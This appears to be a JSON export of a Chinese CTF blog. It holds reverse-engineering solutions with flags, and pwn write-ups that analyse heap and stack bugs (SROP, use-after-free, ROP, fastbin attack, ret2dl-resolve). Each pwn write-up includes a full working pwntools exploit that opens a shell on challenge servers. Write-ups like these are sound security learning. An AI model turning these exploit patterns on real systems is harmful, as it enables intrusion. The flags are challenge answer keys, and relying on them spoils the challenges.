{"meta":{"title":"4eriri's blog","subtitle":null,"description":null,"author":"4eriri","url":"http://yoursite.com"},"pages":[{"title":"XCTF攻防世界REVERSE","date":"2019-05-21T05:49:20.000Z","updated":"2019-05-28T16:17:25.302Z","comments":true,"path":"XCTF攻防世界REVERSE.html","permalink":"http://yoursite.com/XCTF攻防世界REVERSE.html","excerpt":"菜鸡还是从刷题做起吧……","text":"菜鸡还是从刷题做起吧…… 001 dmd-50输入md5后与780438d5b6e29db0898bc4f0225935c0进行比较，md5解密后得正确输入 b781cbb29054db12f88f08c6e161c199。 002 Shuffle明文flag SECCON{Welcome to the SECCON 2014 CTF!} 003 crackmeESP定律脱壳，简单加密 逆运算脚本： 123key=&quot;this_is_not_flag&quot;s=[0x12, 0x04, 0x08, 0x14, 0x24, 0x5C, 0x4A, 0x3D, 0x56, 0x0A, 0x10, 0x67,0x0,0x41, 0x0,0x01, 0x46, 0x5A, 0x44, 0x42, 0x6E, 0x0C, 0x44, 0x72, 0x0C, 0x0D, 0x40, 0x3E, 0x4B, 0x5F, 0x02, 0x01, 0x4C, 0x5E, 0x5B, 0x17, 0x6E, 0x0C, 0x16, 0x68, 0x5B, 0x12, 0x48,0x0e]print &apos;&apos;.join([chr(s[i]^ord(key[i%16]))for i in range(42)]) flag{59b8ed8f-af22-11e7-bb4a-3cf862d1ee75} 004 re2-cpp-is-awesome根据给的index表在table中取值得到flag： 123table=&quot;L3t_ME_T3ll_Y0u_S0m3th1ng_1mp0rtant_A_&#123;FL4G&#125;_W0nt_b3_3X4ctly_th4t_345y_t0_c4ptur3_H0wev3r_1T_w1ll_b3_C00l_1F_Y0u_g0t_1t&quot;index=[36, 0, 0, 0, 0, 0, 0, 0, 5, 0, 0, 0, 54, 0, 0, 0, 101, 0, 0, 0, 7, 0, 0, 0, 39, 0, 0, 0, 38, 0, 0, 0, 45, 0, 0, 0, 1, 0, 0, 0, 3, 0, 0, 0, 0, 0, 0, 0, 13, 0, 0, 0, 86, 0, 0, 0, 1, 0, 0, 0, 3, 0, 0, 0, 101, 0, 0, 0, 3, 0, 0, 0, 45, 0, 0, 0, 22, 0, 0, 0, 2, 0, 0, 0, 21, 0, 0, 0, 3, 0, 0, 0, 101, 0, 0, 0, 0, 0, 0, 0, 41, 0, 0, 0, 68, 0, 0, 0, 68, 0, 0, 0, 1, 0, 0, 0, 68, 0, 0, 0, 43, 0, 0, 0]print &apos;&apos;.join([table[index[i]] for i in range(0,len(index),4)]) ALEXCTF{W3_L0v3_C_W1th_CL45535} 005 re-for-50-plz-50MIPS汇编 输入的每个字符异或0x37后与cbtcqLUBChERV[[Nh@_X^D]X_YPV[CJ比较 逆运算得flag：TUCTF{but_really_whoisjohngalt} 006 The Maya Society这题有点脑洞 计算机时间改为2012-12-21运行程序即可得到flag: flag{e3a03c6f3fe91b40eaa8e71b41f0db12} 007 key运行程序会报：&quot;?W?h?a?t h?a?p?p?e?n?&quot; ida分析一波发现是读取不到C:\\\\Users\\\\CSAW2016\\\\haha\\\\flag_dir\\\\flag.txt，所以报错，建立该文件，继续运行。再次运行会提示=W=r=o=n=g=K=e=y= 定位到此处： 1234567891011121314151617181920212223if ( sub_4020C0(&amp;v44, v12, v45, (int)v13, v48) ) &#123; v28 = sub_402A00(std::cout, &quot;=W=r=o=n=g=K=e=y=&quot;, sub_402C50); &#125; else &#123; v14 = sub_402A00(std::cout, &quot;|------------------------------|&quot;, sub_402C50); std::basic_ostream&lt;char,std::char_traits&lt;char&gt;&gt;::operator&lt;&lt;(v14, v15); v16 = sub_402A00(std::cout, &quot;|==============================|&quot;, sub_402C50); std::basic_ostream&lt;char,std::char_traits&lt;char&gt;&gt;::operator&lt;&lt;(v16, v17); v18 = sub_402A00(std::cout, &quot;|==============================|&quot;, sub_402C50); std::basic_ostream&lt;char,std::char_traits&lt;char&gt;&gt;::operator&lt;&lt;(v18, v19); v20 = sub_402A00(std::cout, &quot;|==============================|&quot;, sub_402C50); std::basic_ostream&lt;char,std::char_traits&lt;char&gt;&gt;::operator&lt;&lt;(v20, v21); v22 = sub_402A00(std::cout, &quot;\\\\ /\\\\ /\\\\ /\\\\ /\\\\==============|&quot;, sub_402C50); std::basic_ostream&lt;char,std::char_traits&lt;char&gt;&gt;::operator&lt;&lt;(v22, v23); v24 = sub_402A00(std::cout, &quot; \\\\/ \\\\/ \\\\/ \\\\/ \\\\=============|&quot;, sub_402C50); std::basic_ostream&lt;char,std::char_traits&lt;char&gt;&gt;::operator&lt;&lt;(v24, v25); v26 = sub_402A00(std::cout, &quot; |-------------|&quot;, sub_402C50); std::basic_ostream&lt;char,std::char_traits&lt;char&gt;&gt;::operator&lt;&lt;(v26, v27); std::basic_ostream&lt;char,std::char_traits&lt;char&gt;&gt;::operator&lt;&lt;(std::cout, sub_402C50); v28 = sub_402A00(std::cout, &quot;Congrats You got it!&quot;, sub_402C50); &#125; 使用od跟进sub_4020c0，调试发现是在进行字符串比较4eriri是我自己建立的flag.txt中的内容，比较的字符串可能就是正确的flag，提交发现正确。 idg_cni~bjbfi|gsxb 008 simple-check-100给了三个文件，随便找一个逆一下就ok了 1234567891011121314unsigned char flagdata[28]=&#123;0xDC, 0x17, 0xBF, 0x5B, 0xD4, 0x0A, 0xD2, 0x1B, 0x7D, 0xDA, 0xA7, 0x95, 0xB5, 0x32, 0x10, 0xF6, 0x1C, 0x65, 0x53, 0x53, 0x67, 0xBA, 0xEA, 0x6E, 0x78, 0x22, 0x72, 0xD3&#125;;unsigned int a1[7]=&#123;0xe37ec854,0x9a16c764,0x326511cd,0x43d3e32d,0xd29da992,0xd32c6de6,0x6afebdb6&#125;;for(int i=0;i&lt;7;i++) a1[i]^=0xdeadbeef;unsigned char key[28]=&#123;0&#125;;memcpy(key,a1,28);unsigned char flag[28]=&#123;0&#125;;for(int i=0;i&lt;28;i++)&#123; flag[i]=flagdata[i]^key[i]; printf(&quot;%c&quot;,flag[i]);&#125; 脚本有点小小的问题，自己读一下flag flag_is_you_know_cracking!!!"},{"title":"强网杯2019-babycpp","date":"2019-05-29T14:36:35.000Z","updated":"2019-06-12T13:34:53.220Z","comments":true,"path":"强网杯2019-babycpp.html","permalink":"http://yoursite.com/强网杯2019-babycpp.html","excerpt":"人人人师傅tql，我大哥是人人人.jpg。","text":"人人人师傅tql，我大哥是人人人.jpg。 程序功能 new array show element set element update hash exit 其中，最多可以new 16个array，并且可以选择new int array或者string array，两者在show element和set element时实际调用的函数不同，就是c++中的虚函数的概念。"}],"posts":[{"title":"ciscn_2019_es_7","slug":"ciscn-2019-es-7","date":"2019-08-02T15:10:37.000Z","updated":"2019-08-02T15:17:27.886Z","comments":true,"path":"2019/08/02/ciscn-2019-es-7/","link":"","permalink":"http://yoursite.com/2019/08/02/ciscn-2019-es-7/","excerpt":"SROP，甚至比CTFWIKI上的例题简单。","text":"SROP，甚至比CTFWIKI上的例题简单。 程序分析12345678910111213push rbpmov rbp, rspxor rax, raxmov edx, 400h ; countlea rsi, [rsp+buf] ; bufmov rdi, rax ; fdsyscall ; LINUX - sys_readmov rax, 1mov edx, 30h ; countlea rsi, [rsp+buf] ; bufmov rdi, rax ; fdsyscall ; LINUX - sys_writeretn 调用syscall read&amp;write，之后直接retn。 同时给了两个gadget，方便修改rax为相应的系统调用号。 1234mov rax, 0Fh //constants.SYS_sigreturnretn mov rax, 3Bh //constants.SYS_execveretn CTFWIKI上的例题只给了read调用，write调用还需要自己巧妙构造，这里直接可以leak出stack地址，然后就照着CTFWIKI上的脚本稍微改一改就行了。 EXP1#!/usr/bin/env python from pwn import * from LibcSearcher import * #sh=process(&quot;./ciscn_2019_es_7.dms&quot;) context.arch=&apos;amd64&apos; sh=remote(&quot;f.buuoj.cn&quot;,20179) syscall_ret=0x400517 read=0x4004f1 movrax_sigreturn=0x4004da movrax_system=0x4004E2 sh.send(&quot;/bin/sh&quot;+&quot;\\x00&quot;*9+p64(read)) sh.recv(32) stack_addr=u64(sh.recv(8)) log.success(&quot;stack: &quot;+hex(stack_addr)) sh.recv(8) sigframe = SigreturnFrame() sigframe.rax = constants.SYS_execve sigframe.rdi = stack_addr - 280 # &quot;/bin/sh&quot; &apos;s addr sigframe.rsi = 0x0 sigframe.rdx = 0x0 sigframe.rsp = stack_addr sigframe.rip = syscall_ret sh.send(&quot;/bin/sh&quot;+&quot;\\x00&quot;*9+p64(movrax_sigreturn)+p64(syscall_ret)+str(sigframe)) sh.interactive()","categories":[],"tags":[]},{"title":"hacknote","slug":"hacknote","date":"2019-07-31T18:41:10.000Z","updated":"2019-07-31T18:59:07.215Z","comments":true,"path":"2019/08/01/hacknote/","link":"","permalink":"http://yoursite.com/2019/08/01/hacknote/","excerpt":"感觉BUU有些写不动又回来刷攻防世界的一些简单题了2333","text":"感觉BUU有些写不动又回来刷攻防世界的一些简单题了2333 程序功能11. Add note 2. Delete note 3. Print note 4. Exit 每次Add都会malloc(0x8)，其中fd用来存放一个自定义的puts函数，会打印出*bk，然后再malloc(输入的size)作为记录内容的chunk，将返回的地址存入bk。 程序漏洞Delete后没有置零，存在UAF，Print时调用fd位置的函数。 漏洞利用1234Add(0x10,&apos;0&apos;)Add(0x10,&apos;1&apos;)Del(0)Del(1) 此时fastbin中会用两个单链表记录空闲的chunk，两个大小为0x10的chunk（malloc(0x8)时得到的chunk）会被记录在一个链表中。 12Add(0x8,p32(0x804862b)+p32(0x804A024))#0x804862b为自定义的puts函数的地址 Print(0) leak=u32(sh.recv(4)) log.success(&quot;puts: &quot;+hex(leak)) puts=leak libc=LibcSearcher(&apos;puts&apos;,puts) libcbase=leak-libc.dump(&apos;puts&apos;) 再次Add(0x8)，此时得到的存放内容的chunk就是chunk0的malloc(0x8)的chunk，并且由于UAF，此时Print(0)还可以使用，修改chunk2的内容，改变chunk0的bk部分为puts_got，再Print(0)即可leak出libc地址。这里攻防世界给的libc好像给错了，自己找了一下libc才对得上。 1Del(2) Add(0x8,p32(libcbase+libc.dump(&apos;system&apos;))+&quot;||sh&quot;) Print(0) sh.interactive() 然后把chunk2删除再次申请，又可以再次修改chunk0。这次将函数指针改成system地址，Print(0)时即会执行system(fd)，但是fd上存放的就是system地址，这里学习了一手||。在bk位置写上’||sh’，执行的就是system(systemaddr||sh)，可以获取shell。 EXP1#!/usr/bin/env python from pwn import * from LibcSearcher import * #sh=process(&quot;./hacknote.dms&quot;) libc2=ELF(&quot;./libc-2.23.so&quot;) #onegadget=[0x45216,0x4526a,0xf02a4,0xf1147] sh=remote(&apos;111.198.29.45&apos;,41371) def Add(size,content): sh.sendlineafter(&apos;choice :&apos;,&apos;1&apos;) sh.sendlineafter(&apos;size :&apos;,str(int(size))) sh.sendlineafter(&apos;Content :&apos;,content) def Del(Index): sh.sendlineafter(&apos;choice :&apos;,&apos;2&apos;) sh.sendlineafter(&apos;Index :&apos;,str(Index)) def Print(Index): sh.sendlineafter(&apos;choice :&apos;,&apos;3&apos;) sh.sendlineafter(&apos;Index :&apos;,str(Index)) Add(0x10,&apos;0&apos;) Add(0x10,&apos;1&apos;) Del(0) Del(1) Add(0x8,p32(0x804862b)+p32(0x804A024)) Print(0) leak=u32(sh.recv(4)) log.success(&quot;puts: &quot;+hex(leak)) puts=leak libc=LibcSearcher(&apos;puts&apos;,puts) libcbase=leak-libc.dump(&apos;puts&apos;) Del(2) Add(0x8,p32(libcbase+libc.dump(&apos;system&apos;))+&quot;||sh&quot;) Print(0) sh.interactive()","categories":[],"tags":[]},{"title":"ciscn_2019_emachine","slug":"ciscn-2019-c-1","date":"2019-07-30T04:52:30.000Z","updated":"2019-07-30T05:31:58.125Z","comments":true,"path":"2019/07/30/ciscn-2019-c-1/","link":"","permalink":"http://yoursite.com/2019/07/30/ciscn-2019-c-1/","excerpt":"说起来这题算是国赛过程中自己做的唯一一题2333，tcl","text":"说起来这题算是国赛过程中自己做的唯一一题2333，tcl 程序功能121.Encrypt2.Decrypt 其实只有一个功能Encrypt，Decrypt需要自己手动操作。 程序漏洞Encrypt中存在栈溢出 漏洞利用Encrypt会对输入进行加密，所以要让输入被加密后构成有效的ROP。 之前被加密过位置的就不会再被加密。例如第一次输入了a，加密后变成l，第二次输入aa，就只有第二个a会被加密，加密后变成al。 main函数地址为0x400b28，若输入为0x4e0b28，加密后恰好能变成main函数地址。用这个输入多填充几个地址，确保之后构造ROP时不会被加密。 比赛时没给libc，但差别不大，这次就按有libc来做了。 EXP1#coding=UTF-8 from pwn import * sh=remote(&quot;buuoj.cn&quot;,20115) #sh=process(&apos;/media/psf/Home/Desktop/Challenges/BUUpwn/ciscn_2019_c_1.dms&apos;,env=&#123;&quot;LD_PRELOAD&quot;:&apos;./x64_libc.so.6&apos;&#125;) elf=ELF(&apos;/media/psf/Home/Desktop/Challenges/BUUpwn/ciscn_2019_c_1.dms&apos;) libc=ELF(&apos;./x64_libc.so.6&apos;) def send(content): sh.recvuntil(&quot;Input your choice!\\n&quot;) sh.sendline(&quot;1&quot;) sh.recvuntil(&quot;Input your Plaintext to be encrypted\\n&quot;) sh.sendline(content) main=0x400B28 main_enc=0x4e0b28 pop_rdi=0x400c83 send(&apos;a&apos;*0x58+p64(main_enc)*10) send(&apos;a&apos;*0x58+p64(pop_rdi)+p64(elf.got[&apos;puts&apos;])+p64(elf.plt[&apos;puts&apos;])+p64(main)) sh.recvuntil(&apos;@\\n&apos;) leak=u64(sh.recv(6).ljust(8,&apos;\\x00&apos;)) libc_base=leak-libc.sym[&apos;puts&apos;] log.success(&quot;libcbase: &quot;+hex(libc_base)) send(&apos;a&apos;*0x58+p64(pop_rdi)+p64(libc_base+0x18cd57)+p64(libc_base+libc.sym[&apos;system&apos;])) sh.interactive()","categories":[],"tags":[]},{"title":"babyheap_0ctf_2017","slug":"babyheap-0ctf-2017","date":"2019-07-29T14:31:21.000Z","updated":"2019-07-29T14:51:38.994Z","comments":true,"path":"2019/07/29/babyheap-0ctf-2017/","link":"","permalink":"http://yoursite.com/2019/07/29/babyheap-0ctf-2017/","excerpt":"回家之后这么热居然感冒了，在床上躺了一天Orz","text":"回家之后这么热居然感冒了，在床上躺了一天Orz 程序功能12341.alloc2.fill3.free4.dump 在alloc时，程序会分配大小为24个字节的存储结构： 123inuse 记录该chunk是否处于使用状态size 记录该chunk大小*ptr 记录alloc出的chunk的地址 程序漏洞在fill时，读入的size并非alloc记录的size，而是另外输入，因此产生了堆溢出。 漏洞利用申请四块chunk。 1Add(0x10) Add(0x10) Add(0x80) Add(0x10) 修改第二块chunk的size为0x40，并修改第三块chunk的size，标记上一块chunk处于使用状态。Free第二块chunk后申请大小为0x30的chunk，第三块chunk的head部分与fd，bk被包含进第二块chunk的content部分。 12Fill(0,0x20,p64(0)*3+p64(0x41)) Fill(2,0x20,p64(0)*3+p64(0x71))Free(1) Add(0x30） Free第三块chunk，其fd，bk为main_arena+88，dump第二块chunk得到此地址，leak出libc基址。由于分配chunk时使用的是calloc，第三块chunk的head在第二次申请第二块chunk时被置零，需要先修复才能Free。 12Fill(1,0x20,p64(0)*3+p64(0x91)) Free(2) Dump(1)Dump(1) sh.recvuntil(&apos;\\x91&apos;+&apos;\\x00&apos;*7) leak=u64(sh.recv(6).ljust(8,&apos;\\x00&apos;)) malloc_hook=leak-88-0x10 print hex(malloc_hook) libc_base=leak-0x3C4B20-88 one_gadget=libc_base+onegadget[1] fakefd=malloc_hook-0x23 之后在malloc_hook上方错位构造大小为0x7f的chunk，通过Fastbin attack获取该chunk，修改malloc_hook。 EXP1#coding=UTF-8 from pwn import * sh=remote(&quot;buuoj.cn&quot;,20001) #sh=process(&apos;/media/psf/Home/Desktop/Challenges/BUUpwn/babyheap_0ctf_2017.dms&apos;,env=&#123;&quot;LD_load&quot;:&apos;./x64_libc.so.6&apos;&#125;) libc=ELF(&quot;./x64_libc.so.6&quot;) onegadget=[0x45216,0x4526a,0xf02a4,0xf1147] def Add(Size): sh.recvuntil(&quot;Command: &quot;) sh.sendline(&quot;1&quot;) sh.recvuntil(&quot;Size: &quot;) sh.sendline(str(int(Size))) def Fill(Index,Size,Content): sh.recvuntil(&quot;Command: &quot;) sh.sendline(&quot;2&quot;) sh.recvuntil(&quot;Index: &quot;) sh.sendline(str(Index)) sh.recvuntil(&quot;Size: &quot;) sh.sendline(str(int(Size))) sh.recvuntil(&quot;Content: &quot;) sh.send(Content) def Free(Index): sh.recvuntil(&quot;Command: &quot;) sh.sendline(&quot;3&quot;) sh.recvuntil(&quot;Index: &quot;) sh.sendline(str(Index)) def Dump(Index): sh.recvuntil(&quot;Command: &quot;) sh.sendline(&quot;4&quot;) sh.recvuntil(&quot;Index: &quot;) sh.sendline(str(Index)) Add(0x10) Add(0x10) Add(0x80) Add(0x10) Fill(0,0x20,p64(0)*3+p64(0x41)) Fill(2,0x20,p64(0)*3+p64(0x71)) Free(1) Add(0x30) Fill(1,0x20,p64(0)*3+p64(0x91)) Free(2) Dump(1) sh.recvuntil(&apos;\\x91&apos;+&apos;\\x00&apos;*7) leak=u64(sh.recv(6).ljust(8,&apos;\\x00&apos;)) malloc_hook=leak-88-0x10 print hex(malloc_hook) libc_base=leak-0x3C4B20-88 one_gadget=libc_base+onegadget[1] fakefd=malloc_hook-0x23 Add(0x60) Free(2) Fill(1,0x28,p64(0)*3+p64(0x71)+p64(fakefd)) Add(0x60) Add(0x60) Fill(4,0x13+8,&apos;a&apos;*0x13+p64(one_gadget)) Add(0x10) sh.interactive()","categories":[],"tags":[]},{"title":"安恒杯2019年5月月赛","slug":"安恒杯2019年5月月赛","date":"2019-05-30T08:46:40.000Z","updated":"2019-06-09T12:46:43.755Z","comments":true,"path":"2019/05/30/安恒杯2019年5月月赛/","link":"","permalink":"http://yoursite.com/2019/05/30/安恒杯2019年5月月赛/","excerpt":"西湖论剑线下赛复现专场","text":"西湖论剑线下赛复现专场 easycrack简单的替换，也可以在strcmp下断，调试得到flag。 Testre2得到flag之后才知道是RC5，逆的过程中只觉得中间加密部分的逻辑和骑驴师傅出的考核题差不多2333 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152#include &lt;stdio.h&gt;int main()&#123; unsigned int key[26]=&#123;0&#125;; key[0]=0xb7e15163; for(int i=1;i&lt;26;i++) key[i]=key[i-1]-0x61c88647; unsigned int a1[4]=&#123;0x243F6A88,0x85A308D3,0x452821E6,0x38D01377&#125;; unsigned int v5=0,v6=0,v7=0; for(int i=0;i&lt;78;i++) &#123; key[i%26]=( (key[i%26]+v5+v6)&lt;&lt;(3&amp;0x1f) ) | ( (key[i%26]+v5+v6)&gt;&gt;(32-(3&amp;0x1f)) ); v5=key[i%26]; a1[i&amp;3]=( (a1[i&amp;3]+v5+v6)&lt;&lt;((v5+v6)&amp;0x1f) ) | ( (a1[i&amp;3]+v5+v6)&gt;&gt;(32-((v5+v6)&amp;0x1f)) ); v6=a1[i&amp;3]; &#125; unsigned int final[4]=&#123;0xF4A956BF,0xBA568F3D,0xD73A7F7C,0x817F532B&#125;; //unsigned int final[4]=&#123;0X6EA91D54,0X7C5153BA,0X339AABC3,0X6672A3A9&#125;; unsigned int input[4]=&#123;0x30303030,0x30303030,0x30303030,0x30303030&#125;; //encrypt /*for(int j=0;j&lt;=3;j+=2) &#123; v6=key[0]+input[j]; v7=key[1]+input[j+1]; for(int k=0;k&lt;=11;++k) &#123; v6=(( (v6^v7 )&lt;&lt;(v7&amp;0x1f) ) | ( (v6^v7 )&gt;&gt;(32-(v7&amp;0x1f)) ) )+key[2*j]; v7=(( (v6^v7 )&lt;&lt;(v6&amp;0x1f) ) | ( (v6^v7 )&gt;&gt;(32-(v6&amp;0x1f)) ) )+key[2*j+1]; &#125; input[j]=v6; input[j+1]=v7; &#125;*/ //decrypt for(int j=0;j&lt;=3;j+=2) &#123; v6=final[j]; v7=final[j+1]; for(int k=0;k&lt;=11;++k) &#123; v7=( ( ( ((v7-key[2*j+1])&gt;&gt;(v6&amp;0x1f) ) ) |( (v7-key[2*j+1])&lt;&lt; (32-(v6&amp;0x1f) ) ) ) )^v6; v6=( ( ( ((v6-key[2*j])&gt;&gt;(v7&amp;0x1f) ) ) |( (v6-key[2*j])&lt;&lt; (32-(v7&amp;0x1f) ) ) ) )^v7; &#125; input[j]=v6-key[0]; input[j+1]=v7-key[1]; &#125; unsigned char flag[16]=&#123;0&#125;; memcpy(flag,input,16); for(int i=0;i&lt;16;i++) printf(&quot;%c&quot;,flag[i]);&#125; 需要注意的就是运算符的优先级，我记得不是很清楚，所以只能为了运算顺序正确，使用了大量括号orz","categories":[],"tags":[]},{"title":"ISCC2019-pwn01","slug":"ISCC2019-pwn01","date":"2019-05-19T14:13:04.000Z","updated":"2019-05-19T14:35:23.517Z","comments":true,"path":"2019/05/19/ISCC2019-pwn01/","link":"","permalink":"http://yoursite.com/2019/05/19/ISCC2019-pwn01/","excerpt":"ret2-dl-runtime-resolve","text":"ret2-dl-runtime-resolve 简单分析1234567891011int __cdecl main(int argc, const char **argv, const char **envp)&#123; char dest; // [esp+0h] [ebp-16h] size_t n; // [esp+Ah] [ebp-Ch] int *v6; // [esp+Eh] [ebp-8h] v6 = &amp;argc; n = read(0, &amp;buf, 0xF4240u); memcpy(&amp;dest, &amp;buf, n); return 0;&#125; 是很标准的ret2-dl-runtime-resolve例题了，需要注意的是需要看汇编： 123456.text:080484AE lea esp, [ebp-8].text:080484B1 pop ecx.text:080484B2 pop ebx.text:080484B3 pop ebp.text:080484B4 lea esp, [ecx-4].text:080484B7 retn 函数结尾处的汇编是这样的，意味着不能简单地填充溢出，和之前那道DDCTF的pwn一样，需要在特定位置输入正确的值才可以。 不过这一题不一样的是，我们可以直接控制ebp,esp到buf上，然后buf上的数据是受我们输入控制的，再配合一些gadgets就可以完成调用read函数并且换栈。 1sh.send(&apos;aabbbbccccdddd&apos;+p32(buf+30)+p32(0)+p32(buf+26)+p32(read_plt)+p32(ppp_ret)+p32(0)+p32(stage)+p32(100)+p32(pop_ret)+p32(stage)+p32(leave_ret)) 像这样就可以把栈换到stage处，接下来就是标准的ret2-dl-runtime-resolve，详细地原理介绍看CTF-WIKI就可以了。 EXP1# coding=UTF-8 from pwn import * #sh=process(&quot;./pwn01.dms&quot;) sh=remote(&quot;39.100.87.24&quot;,8101) elf=ELF(&apos;./pwn01.dms&apos;) bss=elf.bss() read_plt=elf.plt[&apos;read&apos;] buf=bss+0x20 stage=buf+0x282 #stage=buf+28 pop_ret=0x0804851b ppp_ret=0x08048519 leave_ret=0x080483c5 #gdb.attach(sh) sh.send(&apos;aabbbbccccdddd&apos;+p32(buf+30)+p32(0)+p32(buf+26)+p32(read_plt)+p32(ppp_ret)+p32(0)+p32(stage)+p32(100)+p32(pop_ret)+p32(stage)+p32(leave_ret)) #sh.send(&apos;aabbbbccccdddd&apos;+p32(buf+32)+p32(0)+p32(buf+28)+&apos;aa&apos;+payload2) plt0 = elf.get_section_by_name(&apos;.plt&apos;).header.sh_addr rel_plt = elf.get_section_by_name(&apos;.rel.plt&apos;).header.sh_addr dynsym = elf.get_section_by_name(&apos;.dynsym&apos;).header.sh_addr dynstr = elf.get_section_by_name(&apos;.dynstr&apos;).header.sh_addr index_offset = stage + 28 - rel_plt read_got = elf.got[&apos;read&apos;] read_index = (elf.plt[&apos;read&apos;] - plt0) / 16 - 1 read_index *= 8 r_offset=0x0804a00c fake_sym_addr = stage + 36 align = 0x10 - ((fake_sym_addr - dynsym) &amp; 0xf) fake_sym_addr = fake_sym_addr + align index_dynsym = (fake_sym_addr - dynsym) / 0x10 st_name = fake_sym_addr + 0x10 - dynstr fake_write_sym = flat([st_name, 0, 0, 0x12]) r_info = (index_dynsym &lt;&lt; 8) | 0x7 fake_write_reloc = flat([read_got, r_info]) payload=&apos;aaaa&apos;+p32(plt0)+p32(index_offset)+&apos;aaaa&apos;+p32(stage+84)+&apos;aaaa&apos;+&apos;aaaa&apos;+fake_write_reloc+&apos;a&apos;*align+fake_write_sym+&apos;system\\x00&apos; payload+=&apos;a&apos;*(84-len(payload)) payload+=&apos;sh\\x00&apos; sh.send(payload) #sh.send(payload2) sh.interactive() 基本照抄CTF-WIKI，有的偏移和CTF-WIKI不一样，是因为换栈的方式不一样，我的EXP在第二次使用read函数时，开头四个字符需要输入一个填充，来让leave,ret中pop,ebp时pop，这样后面所有的伪造的结构的地址都要+4。 这题写了很久很久……主要是因为卡在了换栈的位置选择，我之前一直选择bss+400的位置，结果在调用dl_fixup时一直会报错，以为是换栈之类的出了问题，试了很久都不知道为啥，最终要感谢看雪论坛师傅mengllong的评论解救了我： 最后尝试了一下，至少要在bss+0x2a2的位置才不会出错2333","categories":[],"tags":[]},{"title":"DDCTF2019-pwn","slug":"DDCTF2019-pwn","date":"2019-05-16T14:30:32.000Z","updated":"2019-05-17T14:10:43.674Z","comments":true,"path":"2019/05/16/DDCTF2019-pwn/","link":"","permalink":"http://yoursite.com/2019/05/16/DDCTF2019-pwn/","excerpt":"自己补一下栈","text":"自己补一下栈 EXP1from pwn import * sh=process(&quot;./xpwn&quot;) libc=ELF(&quot;./libc.so.6&quot;) sh.recvuntil(&apos;Enter username: &apos;) sh.send(&apos;a&apos;*4*15) sh.recvuntil(&apos;a&apos;*4*15) setbuf=u32(sh.recv(4)) sh.recv(8) ebp=u32(sh.recv(4)) libcbase=setbuf-libc.symbols[&apos;setbuf&apos;] print hex(libcbase) sh.recvuntil(&apos;Please set the length of password: &apos;) sh.sendline(&apos;-1&apos;) sh.recvuntil(&apos;Enter password(lenth 4294967295): &apos;) sh.send(&apos;a&apos;*4*17+p32(ebp-8+0x20)+&apos;a&apos;*4*6+p32(libcbase+libc.symbols[&apos;system&apos;])+p32(0xdeadbeef)+p32(libcbase+libc.search(&apos;/bin/sh&apos;).next())) sh.interactive() 当时没做出来，因为如果直接填充a会报错，中间有一部分是要自己补的，感觉和canary差不多，现在做的时候没远程环境了，本地打不下来。 TCLlibc文件用本地的就行了，看来本地运行的libc和给的libc不一样… libc = ELF(&#39;/lib/i386-linux-gnu/libc.so.6&#39;)","categories":[],"tags":[]},{"title":"某awd的唯一pwn","slug":"某awd的唯一pwn","date":"2019-05-13T08:17:28.000Z","updated":"2019-05-29T14:36:03.920Z","comments":true,"path":"2019/05/13/某awd的唯一pwn/","link":"","permalink":"http://yoursite.com/2019/05/13/某awd的唯一pwn/","excerpt":"仅仅记录一下pwn的wp和如何被吊打","text":"仅仅记录一下pwn的wp和如何被吊打 简单分析存在栈溢出的函数： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950void __fastcall calc(unsigned int a1)&#123; _DWORD *v1; // rbx _DWORD *v2; // rbx _DWORD *v3; // rbx _DWORD *v4; // rbx int v5; // [rsp+1Ch] [rbp-F4h] char dest; // [rsp+20h] [rbp-F0h] void *src; // [rsp+F0h] [rbp-20h] unsigned int v8; // [rsp+FCh] [rbp-14h] if ( a1 &lt;= 0x64 ) &#123; src = malloc(4LL * a1); v8 = 0; while ( v8 &lt; a1 ) &#123; PrintMenu(); __isoc99_scanf(&quot;%d&quot;, &amp;v5); switch ( v5 ) &#123; case 1: v1 = (char *)src + 4 * (signed int)v8; *v1 = Add(); goto LABEL_10; case 2: v2 = (char *)src + 4 * (signed int)v8; *v2 = Sub(); goto LABEL_10; case 3: v3 = (char *)src + 4 * (signed int)v8; *v3 = Mul(); goto LABEL_10; case 4: v4 = (char *)src + 4 * (signed int)v8; *v4 = Div(); goto LABEL_10; case 5: memcpy(&amp;dest, src, 4 * a1); free(src); return; default: puts(&quot;Wrong,please input 1-5&quot;);LABEL_10: ++v8; break; &#125; &#125; &#125;&#125; 如果输入的计算次数足够大，memcpy函数执行后将会产生栈溢出，经过计算，计算次数为62次时，就能覆盖完rbp，之后的计算结果将会覆盖到返回地址。 由于程序中存在system函数，但是不存在/bin/sh字符串，所以利用gadget，先调用read函数，将/bin/sh读到bss段，然后调用system函数获取shell。 EXP12345678910111213141516171819202122232425262728293031323334353637from pwn import * sh =process(&quot;./calculator&quot;)binary=ELF(&apos;./calculator&apos;)def add(s): sh.recvuntil(&quot;operation:&quot;) sh.sendline(&quot;1&quot;) sh.recvuntil(&quot;x:&quot;) sh.sendline(&quot;0&quot;) sh.recvuntil(&quot;y&quot;) sh.sendline(str(int(s)))#sh=remote(&quot;172.20.114.101&quot;,10000)sh.recvuntil(&quot;calculations:&quot;)sh.sendline(&apos;100&apos;)for i in range(62): add(0)pop_rdi=0x400ec3add(pop_rdi)add(0)add(0)add(0)pop_rsi=0x400ec1add(pop_rsi)add(0)add(0x6020a0)add(0)add(0x0)add(0)add(binary.plt[&apos;read&apos;])add(0)add(pop_rdi)add(0)add(0x6020a0)add(0)add(binary.plt[&apos;system&apos;])add(0)sh.sendlineafter(&apos;operation:\\n\\n&apos;,&apos;5&apos;)sh.sendline(&apos;/bin/sh&apos;) 被吊打比赛开始时没有加固时间，由于把ssh改密码的命令记错了(属实弟弟)，很久之后才改了自己的四个靶机的密码(但是在我们之后居然还有队伍没有改密码…)，不过像这种每个队伍的默认用户名和密码都一样的情况应该不会很多吧。 比赛前找了一个软件以为能方便地把所有文件保存下来备份，结果却连不上靶机，最后弄了半天才学会了使用scp命令，获取了pwn文件，并且不知道pwn开放的端口是多少，后来询问工作人员好像一般pwn默认端口是10000，web默认端口是80(工作人员内心os：卧槽居然有菜鸡这都不知道)。 使用了dalao的pwnwaf，但是没有能防住…还是要自己多学习，自己patch才是王道啊。虽然pwn能打别人了，但是没能实现自动cat flag，全程手动cd .. cd .. cat flag.txt获取然后提交flag。比赛时脑瘫了，明明只要把/bin/sh改成cat ../../flag.txt什么的就可以直接拿到flag了… 